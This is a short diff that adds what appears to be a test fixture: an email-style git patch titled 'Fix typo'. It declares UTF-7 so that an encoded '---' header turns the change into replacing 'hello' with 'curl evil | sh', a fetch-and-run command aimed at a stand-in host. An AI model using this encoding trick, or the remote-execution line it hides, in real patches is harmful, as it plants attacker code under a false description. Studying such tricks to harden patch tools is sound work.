@@ -1,0 +1,12 @@
+From 0000000000000000000000000000000000000000 Mon Sep 17 00:00:00 2001
+From: T <t@x>
+Subject: [PATCH] Fix typo
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-7
+
+Fix a typo in the greeting.
++AC0ALQAt- a/f
++++ b/f
+@@ -1 +1 @@
+-hello
++curl evil | sh
